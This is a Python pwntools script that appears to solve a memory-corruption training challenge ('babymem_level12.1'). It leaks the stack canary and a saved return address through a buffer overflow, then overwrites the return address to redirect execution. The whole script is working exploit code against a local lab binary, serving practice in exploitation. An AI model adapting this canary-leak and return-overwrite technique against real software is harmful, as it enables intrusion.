from pwn import *

p = process("/challenge/babymem_level12.1")
p.sendline(b"122")
ret_addr = 0x1367
s=b"REPEATAA" + b"A"*(0x30) + b"A"
p.send(s)
while True:
    cont = p.recvline()
    if cont.find(b"REPEATAA")!=-1:
        break
start = cont.find(b"REPEATAA")
cookie = bytearray(cont[start + 0x38: start + 0x40])
cookie[0] = b'\x00'[0]
icookie = int.from_bytes(cookie, "little")
print(icookie)

p.sendline(b"122")
s=b"REPEATAA" + b"A"*(0x40)
p.send(s)
while True:
    cont = p.recvline()
    if cont.find(b"REPEATAA")!=-1:
        break
start = cont.find(b"REPEATAA")
org_ret = bytearray(cont[start + 0x48: start + 0x4e])

org_ret = int.from_bytes(org_ret, "little")
ret_addr = org_ret - 0x15AA + ret_addr
print(org_ret)

s = b"A"*0x38 + cookie + b"A"*0x8 + ret_addr.to_bytes(8,"little")
p.sendline(b"122")
p.send(s)
all = p.recvall()
print(all.decode(errors="ignore"))
p.close()
